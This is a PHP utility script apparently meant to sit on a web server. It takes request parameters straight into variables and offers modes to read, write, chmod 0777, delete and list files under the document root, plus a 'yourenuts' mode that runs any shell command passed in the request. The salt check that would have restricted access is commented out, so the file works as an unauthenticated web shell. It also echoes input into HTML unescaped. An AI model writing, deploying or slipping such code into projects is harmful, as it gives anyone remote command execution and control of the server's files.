<? error_reporting(1) ?>

<?
// <link href="/psi.ico" rel="shortcut icon" type="image/x-icon"/>
// <link href="/reset.css" rel="stylesheet" type="text/css"/>
// <link href="/base.css" rel="stylesheet" type="text/css"/>
// require ("util.php");

$_ = $_POST ? $_POST : $_GET;
if (!$_) {
	echo "try again.\n";
	return;
}
extract($_);

// if ($salt !== "eirugherwilguherhiuerh") :
//     exit();
// endif;

if (!$dataType) {
// <title><?= $mode ?//></title>
	$dataType = "text";
}

switch ($mode) {
	case "agent":
		foreach ($_SERVER as $key => $val) {
			$server[strtolower($key) ] = trim(strip_tags($val));
		}
		ksort($server);
		if ($dataType === "html") {
?><table><? foreach ($server as $key => $val) {
?><tr><?
?><th><?= $key ?></th><?
?><td><?= $val ?></td><?
?></tr><? }
?></table><?
		}
		else {
			format($server);
		}
	break;

	case "cwd":
	case "pwd":
		echo getcwd();
	break;

	case "ip":
		echo ip();
	break;

	case "ipmore":
		format(ipmore($ip));
	break;

	case "geoip":
		$output = geoip($ip);
		format($output);
	break;

	case "read":
	case "file_get_contents":
		$handle = $_SERVER['DOCUMENT_ROOT'] . $handle;
		echo file_get_contents($handle);
	break;

	case "touch":
	case "mk":
		$handle = $_SERVER['DOCUMENT_ROOT'] . $handle;

		$f = fopen($handle, "w");
		chmod($handle, 0777);
		fclose($f);
		echo $handle . " created.";
	break;

	case "unlink":
	case "rm":
		$handle = $_SERVER['DOCUMENT_ROOT'] . $handle;

		unlink($handle);
	break;

	case "write":
		$handle = $_SERVER['DOCUMENT_ROOT'] . $handle;
		$f = fopen($handle, "w+");
		chmod($handle, 0777);
		fwrite($f, $content);
		fclose($f);
	break;

	case "mkdir":
		$handle = $_SERVER['DOCUMENT_ROOT'] . $handle;

		mkdir($handle) or die($handle . " not created.\n");
		chmod($handle, 0777);
		echo $handle . " created.\n";
	break;

	case "ls":
		// $output = listdir($handle, $include, $exts);
		$handle = $_SERVER['DOCUMENT_ROOT'] . $handle;
		$folder = array_diff(scandir($handle), array('..', '.'));
		format($folder, $dataType);
	break;

	case "geturls":
		$handle = $_SERVER['DOCUMENT_ROOT'] . $handle;

		$output = geturls($handle);
		format($output);
	break;

	case "yourenuts":
		$output = `$cmd`;
		format($output);
	break;

	case "proxy":
		$handle = $_SERVER['DOCUMENT_ROOT'] . $handle;

		$output = proxy($handle, $header, $timeout);
		format($output);
	break;

	default:
		echo "try again.\n";
	break;
}
function is_url($i) {
	return preg_match('|^http(s)?://[a-z0-9-]+(.[a-z0-9-]+)*(:[0-9]+)?(/.*)?$|i', $i);
}
function geoip() {
	global $ip;
	if (!$ip) {
		$ip = ip();
	}
	$result["ipinfo.io"] = json_decode(file_get_contents("http://ipinfo.io/$ip/json"));
	$result["hostip.info"] = file_get_contents("http://api.hostip.info/?ip=$ip");
	$result["freegeoip.net"] = json_decode(file_get_contents("http://freegeoip.net/json/$ip"));
	$result["smart-ip.net"] = file_get_contents("http://smart-ip.net/geoip-json");
	$result["ipinfodb.com"] = file_get_contents("http://ipinfodb.com/ip_locator.php?ip=$ip");
	return $result;
}
function listdir($handle, $include, $exts) {
	if ($handle) {
		$dir = $handle;
	}
	else {
		$dir = getcwd();
	}
	$counter = 0;
	$exts = explode(",", $exts);
	if (is_dir($dir)) {
		if ($dh = opendir($dir)) {
			while (($file = readdir($dh)) !== false) {
				if ($file == "." || $file == ".." || substr($file, 0, 1) == ".") {
					continue;
				}
				if (!in_array(end(explode('.', $file)), $exts)) {
					continue;
				}
				if (is_dir($file) && $include === "dir") {
					$output[0][] = $counter;
					$output[1][] = $file;
					$output[2][] = "dir";
					$output[3][] = $dir . "/" . $file;
					$counter++;
				}
				else if (!is_dir($file) && $include === "file") {
					$output[0][] = $counter;
					$output[1][] = $file;
					$output[2][] = "file";
					$output[3][] = $dir . "/" . $file;
					$counter++;
				}
			}
		}
	}
	return $output;
}
function geturls($handle) {
	$data = file_get_contents($handle);
	$data = strip_tags($data, "<a>");
	$data = preg_replace("/\s+/", " ", $data);
	$d = preg_split("/<\/a>/", $data);
	foreach ($d as $k => $u) {
		if (strpos($u, "<a") !== FALSE) {
			$u = preg_replace("/.*<a.+href=\"/sm", "", $u);
			$u = preg_replace("/\".*/", "", $u);
			$u = preg_replace('/\?.*/', '', $u);
			$d[trim($k) ] = trim($u);
		}
	}
	return array_values(array_unique($d));
}

function ip() {
	if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$theip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	}
	else {
		$theip = $_SERVER['REMOTE_ADDR'];
	}
	return trim($theip);
}

function ipmore($ip) {
	if (!$ip) {
		$ip = ip();
	}
	$result["IPv4"] = $ip;
	$result["IPv6"] = ip2long($ip);
	return $result;
}

function format($input, $dataType = "text") {
	global $id;
	sort($input);
	if ($dataType === "json") {
		echo json_encode($input);
	}
	else if ($dataType === "html:select") {
		echo "<select";
		if ($id) {
			echo " id='$id'";
		}
		echo ">";
		echo "<option value='$row'></option>";

		foreach($input as $row) {
			echo "<option value='$row'>";
			echo $row;
			echo "</option>";
		}
		echo "</select>";
	}
	else if ($dataType === "pre") {
		echo "<pre>";
		print_r($input);
		echo "</pre>";
	}
	else if ($dataType === "raw") {
		echo $input;
	}
	else {
		print_r($input);
	}
}

if ($debug == true) {
	print_r($_);
}
?>
